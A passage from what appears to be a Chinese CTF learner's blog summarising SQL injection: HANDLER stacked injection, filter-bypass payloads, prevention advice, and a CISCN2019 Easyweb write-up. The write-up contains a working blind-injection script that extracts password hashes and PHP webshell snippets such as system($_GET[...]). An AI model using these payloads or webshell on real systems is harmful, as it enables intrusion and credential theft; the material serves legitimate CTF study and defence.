class="line">            print(&quot;请输入已经得到的数据表名:&quot;,end=&#x27;&#x27;)</span><br><span class="line">            table = input()</span><br><span class="line">            if types == 4:</span><br><span class="line">                columns_n(url,database,table)</span><br><span class="line">            elif types == 5:</span><br><span class="line">                print(&quot;爆字段值开始行号:&quot;,end=&#x27;&#x27;)</span><br><span class="line">                n = int(input())</span><br><span class="line">                columns(url,database,table,n)</span><br><span class="line">        elif types == 6:</span><br><span class="line">            print(&quot;请输入要查询的数据表名:&quot;,end=&#x27;&#x27;)</span><br><span class="line">            table = input()</span><br><span class="line">            datas(url,table)</span><br><span class="line">        else:</span><br><span class="line">            dbs(url)</span><br></pre></td></tr></table></figure>



<h4 id="3-10-handler"><a href="#3-10-handler" class="headerlink" title="3.10 handler"></a>3.10 handler</h4><p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br>HANDLER语句提供通往表的直接通道的存储引擎接口，可以用于MyISAM和InnoDB表。<br>用法:</p>
<p>HANDLER tbl_name OPEN打开一张表，无返回结果，实际上我们在这里声明了一个名为tb1_name的句柄。<br>HANDLER tbl_name READ FIRST获取句柄的第一行，通过READ NEXT依次获取其它行。最后一行执行之后再执行NEXT会返回一个空的结果。<br>HANDLER tbl_name CLOSE来关闭打开的句柄。<br>最后</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;</span><br><span class="line">handler FlagHere open;</span><br><span class="line">handler FlagHere read first;</span><br><span class="line">handler FlagHere close;#</span><br></pre></td></tr></table></figure>

<p>例题：[GYCTF2020]Blacklist</p>
<p>堆叠注入：</p>
<p>注入点：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;show tables#</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210613174056076.png" alt="image-20210613174056076"></p>
<p>使用handler进行payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;;handler `FlagHere` open;handler `FlagHere` read first;#</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210613174425167.png" alt="image-20210613174425167"></p>
<p>强网杯2019随便注同理。</p>
<h2 id="4-sql注入绕过"><a href="#4-sql注入绕过" class="headerlink" title="4.sql注入绕过"></a>4.sql注入绕过</h2><h3 id="4-1-过滤空格"><a href="#4-1-过滤空格" class="headerlink" title="4.1 过滤空格"></a>4.1 过滤空格</h3><p>0x01 使用注释符/**/绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT/**/name/**/FROM/**/table</span><br></pre></td></tr></table></figure>

<p>0x02 使用url编码绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%a0 发出去就是空格的意思，但是需要在burp中抓包后修改</span><br></pre></td></tr></table></figure>

<p>0x03 使用浮点数绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=8E0union select 1,2,3</span><br><span class="line">等价于</span><br><span class="line">select * from users where id=8.0 select 1,2,3</span><br></pre></td></tr></table></figure>

<p>0x04 使用Tab替代空格<br>0x05 使用两个空格替代一个空格<br>0x06 使用括号绕过<br>如果空格被过滤，括号没有被过滤，可以用括号绕过。 在MySQL中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。</p>
<p>例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select(user())from dual where(1=1)and(2=2)</span><br></pre></td></tr></table></figure>

<p>这种过滤方法常常用于time based盲注,例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and(sleep(ascii(mid(database()from(1)for(1)))=109))%23</span><br></pre></td></tr></table></figure>



<h3 id="4-2-过滤引号"><a href="#4-2-过滤引号" class="headerlink" title="4.2 过滤引号"></a>4.2 过滤引号</h3><p>使用16进制绕过<br>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns where table_name=&quot;users&quot;</span><br></pre></td></tr></table></figure>

<p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。 users的十六进制的字符串是7573657273。那么最后的sql语句就变为了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select column_name  from information_schema.columns where table_name=0x7573657273</span><br></pre></td></tr></table></figure>



<h3 id="4-3过滤逗号"><a href="#4-3过滤逗号" class="headerlink" title="4.3过滤逗号"></a>4.3过滤逗号</h3><p>1.使用from关键字绕过<br>对于substr()和mid()这两个方法可以使用from for的方式来解决：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure>

<p>2.使用join关键字绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2</span><br><span class="line">等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure>

<p>3.使用like关键字绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure>

<p>4.使用offset关键字绕过<br>对于limit可以使用offset来绕过：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1</span><br><span class="line">等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure>



<h3 id="4-4过滤注释符（-和-）"><a href="#4-4过滤注释符（-和-）" class="headerlink" title="4.4过滤注释符（#和-）"></a>4.4过滤注释符（#和-）</h3><p>手动闭合引号，不使用注释符</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,&#x27;3</span><br></pre></td></tr></table></figure>



<h3 id="4-5过滤比较符号（-lt-和-gt-）"><a href="#4-5过滤比较符号（-lt-和-gt-）" class="headerlink" title="4.5过滤比较符号（&lt;和&gt;）"></a>4.5过滤比较符号（&lt;和&gt;）</h3><p>1.使用<strong>greatest()、least（）函数</strong>绕过<br>greatest()、least（）：（前者返回最大值，后者返回最小值）</p>
<p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了</p>
<p>最常见的一个盲注的sql语句：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and ascii(substr(database(),0,1))&gt;64</span><br></pre></td></tr></table></figure>

<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值</p>
<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64</span><br></pre></td></tr></table></figure>

<p>使用<strong>between and</strong>绕过<br>between a and b：返回a，b之间的数据，不包含b。</p>
<h3 id="4-6过滤等号"><a href="#4-6过滤等号" class="headerlink" title="4.6过滤等号"></a>4.6过滤等号</h3><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p>
<h3 id="4-7-过滤union，select，where等"><a href="#4-7-过滤union，select，where等" class="headerlink" title="4.7 过滤union，select，where等"></a>4.7 过滤union，select，where等</h3><p>1.使用注释符绕过</p>
<p>常用注释符：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//、--、/**/、#、--+、---、;、%00、--a</span><br></pre></td></tr></table></figure>

<p>用法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure>



<p>2.使用大小写绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure>

<p>3.使用内联注释绕过</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure>

<p>4.使用双关键字绕过（若删除掉第一个匹配的union就能绕过）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure>

<p>5.使用加号+拆解字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">or &#x27;swords&#x27; =&#x27;sw&#x27; +&#x27;ords&#x27; ；EXEC(&#x27;IN&#x27; +&#x27;SERT INTO&#x27;+&#x27;…..&#x27; )</span><br></pre></td></tr></table></figure>

<p>6.使用语法新特性绕过屏蔽select<br>在MySQL 8.0.19版本后，mysql推出了一些新特性，使我们可以不使用select就能够取数据</p>
<p>TABLE 语句<br>可以直接列出表的全部内容</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<p>TABLE是MySQL 8.0.19中引入的DML语句，它返回命名表的行和列，类似于SELECT。<br>支持UNION联合查询、ORDER BY排序、LIMIT子句限制产生的行数。</p>
<p>如 select * from user 就可以用 table user 替代来进行绕过</p>
<p>VALUES 语句<br>可以列出一行的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">VALUES row_constructor_list [ORDER BY column_designator] [LIMIT BY number]</span><br><span class="line"></span><br><span class="line">row_constructor_list:</span><br><span class="line"> ROW(value_list)[, ROW(value_list)][, ...]</span><br><span class="line"></span><br><span class="line">value_list:</span><br><span class="line"> value[, value][, ...]</span><br><span class="line"></span><br><span class="line">column_designator:</span><br><span class="line"> column_index</span><br></pre></td></tr></table></figure>

<p>例如直接列出一行的值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">VALUES ROW(1,2,3), ROW(4,5,6);</span><br></pre></td></tr></table></figure>

<p>VALUES和TABLES语句的结果都是表数据，可以结合起来使用</p>
<h3 id="4-8-其他"><a href="#4-8-其他" class="headerlink" title="4.8 其他"></a>4.8 其他</h3><p>使用多语句的方式执行</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">set @a:=0x73656c656374202a2066726f6d2074657374;</span><br><span class="line">prepare s from @a;</span><br><span class="line">execute s;</span><br></pre></td></tr></table></figure>



<h2 id="5-防止SQL注入"><a href="#5-防止SQL注入" class="headerlink" title="5.防止SQL注入"></a>5.防止SQL注入</h2><h3 id="5-1-严格管理数据类型"><a href="#5-1-严格管理数据类型" class="headerlink" title="5.1 严格管理数据类型"></a>5.1 严格管理数据类型</h3><ol>
<li><p>Java、C#等强类型语言几乎可以完全忽略数字型注入。例如请求id为1的学号，url可能为xxxx/xxxx?id=1,在程序代码中就可能为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int id =Integer.parseInt(request.getParameter(&quot;id&quot;));//接受id参数，并转换为int类型</span><br><span class="line">Number number=numberDao.findNumberId(id);//查询学号</span><br></pre></td></tr></table></figure>

<p>如上诉类型转换，足以抵挡数字型注入</p>
</li>
</ol>
<p>​    2.PHP、ASP等没有强制要求处理数据类型，这类语言会根据参数自动推导出数据类型。假设ID=1，则推到ID的数据类型为Integer；当ID=字符串时，则推导ID的数据类型为string，这一特点在弱类型语言中是危险的。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$sql=&quot;select * from number where id=$id;&quot;;</span><br><span class="line">$number=exec($sql);</span><br></pre></td></tr></table></figure>

<p>攻击者就可以把id=1 and 1=2 union select username,password from users;– 造成sql注入漏洞</p>
<p>要防御此类漏洞，只需要在程序严格判断数据类型即可。如：使用is_number()、ctype_digit()等函数判断数据类型。</p>
<h3 id="5-2-特殊字符转义"><a href="#5-2-特殊字符转义" class="headerlink" title="5.2 特殊字符转义"></a>5.2 特殊字符转义</h3><p>对敏感字符进行转义，如单引号、逗号、括号、union select等等</p>
<p>ps：特别注意要留意是否存在二次注入</p>
<h3 id="5-3-使用预编译语句"><a href="#5-3-使用预编译语句" class="headerlink" title="5.3 使用预编译语句"></a>5.3 使用预编译语句</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$query</span> = <span class="string">&quot;INSERT INTO myCity (Name, CountryCode, Distrit) VALUES (?,?,?)&quot;</span>;</span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$mysqli</span>-&gt;prepare(<span class="variable">$query</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;bind_param(<span class="string">&quot;sss&quot;</span>, <span class="variable">$val1</span>, <span class="variable">$val2</span>, <span class="variable">$val3</span>);</span><br><span class="line"><span class="variable">$val1</span> = <span class="string">&#x27;Stuttgart&#x27;</span>;</span><br><span class="line"><span class="variable">$val2</span> = <span class="string">&#x27;DEU&#x27;</span>;</span><br><span class="line"><span class="variable">$val3</span> = <span class="string">&#x27;Baden-Wuerttemberg&#x27;</span>;</span><br><span class="line"><span class="variable">$stnt</span>-&gt;execute();</span><br></pre></td></tr></table></figure>

<p>这是PHP使用预编译语句的一个例子，在这个例子中，先预编译SQL语句，将变量用?表示。当用户输入参数时，通过bindParam()函数绑定，将输入当做整体传给预编译SQL语句来执行，不会出现执行拼接字符的情况，避免了SQL注入攻击。</p>
<h3 id="5-4-利用框架"><a href="#5-4-利用框架" class="headerlink" title="5.4 利用框架"></a>5.4 利用框架</h3><p>在众多框架中，有一类框架专门与数据库打交道，被称为持久层框架，比较有代表性的是Hibernate、MyBatis、JORM等。</p>
<h3 id="5-5-存储过程"><a href="#5-5-存储过程" class="headerlink" title="5.5 存储过程"></a>5.5 存储过程</h3><p>在数据库中编写好存储过程，使用存储过程处理数据。</p>
<h2 id="6-例题"><a href="#6-例题" class="headerlink" title="6.例题"></a>6.例题</h2><h3 id="6-1-CISCN2019-总决赛-Day2-Web1-Easyweb"><a href="#6-1-CISCN2019-总决赛-Day2-Web1-Easyweb" class="headerlink" title="6.1 [CISCN2019 总决赛 Day2 Web1]Easyweb"></a>6.1 [CISCN2019 总决赛 Day2 Web1]Easyweb</h3><p>开局一个登录界面，扫描后发现robots.txt</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617163910699.png" alt="image-20210617163910699"></p>
<p>目前为止，知道index.php 、user.php和image.php（查看源码发现）</p>
<p>一个个试，发现是image.php.bak</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;config.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;id&quot;</span>]:<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="variable">$path</span>=<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>])?<span class="variable">$_GET</span>[<span class="string">&quot;path&quot;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=addslashes(<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=addslashes(<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$id</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$id</span>);</span><br><span class="line"><span class="variable">$path</span>=str_replace(<span class="keyword">array</span>(<span class="string">&quot;\\0&quot;</span>,<span class="string">&quot;%00&quot;</span>,<span class="string">&quot;\\&#x27;&quot;</span>,<span class="string">&quot;&#x27;&quot;</span>),<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$result</span>=mysqli_query(<span class="variable">$con</span>,<span class="string">&quot;select * from images where id=&#x27;<span class="subst">&#123;$id&#125;</span>&#x27; or path=&#x27;<span class="subst">&#123;$path&#125;</span>&#x27;&quot;</span>);</span><br><span class="line"><span class="variable">$row</span>=mysqli_fetch_array(<span class="variable">$result</span>,MYSQLI_ASSOC);</span><br><span class="line"></span><br><span class="line"><span class="variable">$path</span>=<span class="string">&quot;./&quot;</span> . <span class="variable">$row</span>[<span class="string">&quot;path&quot;</span>];</span><br><span class="line">header(<span class="string">&quot;Content-Type: image/jpeg&quot;</span>);</span><br><span class="line">readfile(<span class="variable">$path</span>);</span><br></pre></td></tr></table></figure>

<p>代码审计</p>
<ol>
<li>addlashes会把单引号、双引号、反斜杠、空字符前面加一个反斜杠\</li>
<li>将传入的id和path进行过滤，将\0  %00  \‘   和’  替换为空</li>
<li>会进行sql语句查询</li>
<li>综上所述，要做的就是绕过过滤，做到sql注入</li>
</ol>
<p>当传入id=\0时，这样会被转义成\\0，然后\0被替换为空，只剩下了一个\，这个反斜杠正好可以转义后面的查询语句中闭合id的单引号。之后我们就可以在path处注入语句。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from images where id=&#x27;\&#x27; or path=&#x27;&#123;$path&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">image.php?id=\\0&amp;path=xxxxxxxxxxxxxxxxxxxxxxxxxxx</span><br></pre></td></tr></table></figure>

<p>当path条件为真是有图像</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\\0&amp;path= or ascii(substr(database(),1,1))&gt;1 %23</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617222422291.png" alt="image-20210617222422291"></p>
<p>当path为假时，没图像且报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=\\0&amp;path= or ascii(substr(database(),1,1))&lt;1 %23</span><br></pre></td></tr></table></figure>

<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617222507272.png" alt="image-20210617222507272"></p>
<p>因此，可以用bool盲注</p>
<p>编写脚本，脚本里有各种爆破payload</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">&quot;http://7e113455-1ad5-45d8-86c3-4a20b8dcf40b.node3.buuoj.cn/image.php?id=\\0&amp;path=or 1=&quot;</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line">last=<span class="string">&quot;tmp&quot;</span></span><br><span class="line">i=<span class="number">0</span></span><br><span class="line"><span class="keyword">while</span>( last != result ):</span><br><span class="line">	i=i+<span class="number">1</span></span><br><span class="line">	head=<span class="number">32</span></span><br><span class="line">	tail=<span class="number">127</span></span><br><span class="line">	<span class="keyword">while</span> head &lt; tail :</span><br><span class="line">		mid = ( head + tail ) &gt;&gt; <span class="number">1</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr(database(),%d,1))&gt;%d,1,-1)%%23&quot;%(i,mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),%d,1))&gt;%d,1,-1)%%23&quot;%(i,mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database() ),%d,1))&gt;%d,1,-1)%%23&quot;%(i,mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 ),%d,1))&gt;%d,1,-1)%%23&quot;%(i,mid)</span></span><br><span class="line">		<span class="comment">#payload = &quot;if(ascii(substr((select group_concat(username) from  users),%d,1))&gt;%d,1,-1)%%23&quot;%(i,mid)</span></span><br><span class="line">		payload = <span class="string">&quot;if(ascii(substr((select group_concat(password) from  users),%d,1))&gt;%d,1,-1)%%23&quot;</span>%(i,mid)</span><br><span class="line">		<span class="comment">#print(url+payload)</span></span><br><span class="line">		r = requests.get(url+payload)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">b&quot;JFIF&quot;</span> <span class="keyword">in</span> r.content :</span><br><span class="line">			head = mid + <span class="number">1</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			tail = mid</span><br><span class="line">            </span><br><span class="line">	last = result</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">chr</span>(head)!=<span class="string">&#x27; &#x27;</span> :</span><br><span class="line">		result += <span class="built_in">chr</span>(head)</span><br><span class="line">	<span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>

<p>ps：payload中的<code>%%</code>其实就用于SQL语句时相当于一个<code>%</code>，用<code>%%代替%</code>加上是为了避免报错</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617223154087.png" alt="image-20210617223154087"></p>
<p>爆出用户名为admin 密码为d3687cdc9c6395381248</p>
<p>登陆进去后，有个上传表单</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617223351048.png" alt="image-20210617223351048"></p>
<p>随便上传一个一句话试试</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617223411851.png" alt="image-20210617223411851"></p>
<p>上传一张图片试试</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617223440178.png" alt="image-20210617223440178"></p>
<p>访问logs/upload.b97e0446eef7947f6b166ad3bc8fdfc4.log.php</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617224806361.png" alt="image-20210617224806361"></p>
<p>可以看到，我上传过的所有文件名都被写进了这个php文件里面。那我就将一句话当作文件名上传</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617224920523.png" alt="image-20210617224920523"></p>
<p>发现被过滤了，查找其他方法</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">1.当仅禁用&lt;?php时，可以使用&lt;?    ?&gt;</span><br><span class="line">要求：需要开启短标签开关，short_open_tag</span><br><span class="line"></span><br><span class="line">2.当禁用&lt;?php以及?&gt;时，还可以使用&lt;?=   </span><br><span class="line">要求：PHP版本&gt;PHP 5.4.0</span><br><span class="line"></span><br><span class="line">3.禁用了&lt;?、 &lt;?php、 ?&gt;时，可以使用asp标签&lt;%  %&gt;</span><br><span class="line">要求：asp_tags设成On</span><br><span class="line"></span><br><span class="line">4.&lt;script language=”php”&gt;system($_GET[jinqi]); </span><br><span class="line">等价于&lt;?php system($_GET[jinqi]);?&gt;</span><br></pre></td></tr></table></figure>

<p>方法二奏效</p>
<p><img src="http://cr_7.gitee.io/git-hub-image/image-20210617225037128.png" alt="image-20210617225037128"></p>
<p>蚁剑连接拿flag即可</p>

      
    </div>
    <div class="article-footer">
      <blockquote class="mt-2x">
  <ul class="post-copyright list-unstyled">
    
    <li class="post-copyright-link hidden-xs">
      <strong>本文链接：</strong>
      <a href="http://example.com/2021/11/15/SQL%E6%B3%A8%E5%85%A5/" title="SQL注入总结" target="_blank" rel="external">http://example.com/2021/11/15/SQL%E6%B3%A8%E5%85%A5/</a>
    </li>
    
    <li class="post-copyright-license">
      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
    </li>
  </ul>
</blockquote>


<div class="panel panel-default panel-badger">
  <div class="panel-body">
    <figure class="media">
      <div class="media-left">
        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
          <img src="/images/avatar.jpg" class="img-rounded w-full" alt="">
        </a>
      </div>
      <div class="media-body">
        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">chickenmushroom</span><small class="ml-1x">Web</small></a></h3>
        <div>平平无奇的小红帽。</div>
      </div>
    </figure>
  </div>
</div>


    </div>
  </article>
  
    
  <section id="comments">
  	
      <div id="vcomments"></div>
    
  </section>


  
</div>

  <nav class="bar bar-footer clearfix" data-stick-bottom>
  <div class="bar-inner">
  
  <ul class="pager pull-left">
    
    <li class="prev">
      <a href="/2021/11/15/ciscn2021%E5%8D%8E%E5%8D%97%E8%B5%9B%E5%8C%BA%E9%A2%84%E8%B5%9B/" title="ciscn2021华南赛区预赛"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;Newer</span></a>
    </li>
    
    
    <li class="next">
      <a href="/2021/11/15/docker%E5%85%A5%E9%97%A8%E5%88%B0%E9%83%A8%E7%BD%B2/" title="docker入门到部署"><span>Older&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
    </li>
    
    
    <li class="toggle-toc">
      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="Catalogue" role="button">
        <span>[&nbsp;</span><span>Catalogue</span>
        <i class="text-collapsed icon icon-anchor"></i>
        <i class="text-in icon icon-close"></i>
        <span>]</span>
      </a>
    </li>
    
  </ul>
  
  
  
  <div class="bar-right">
    
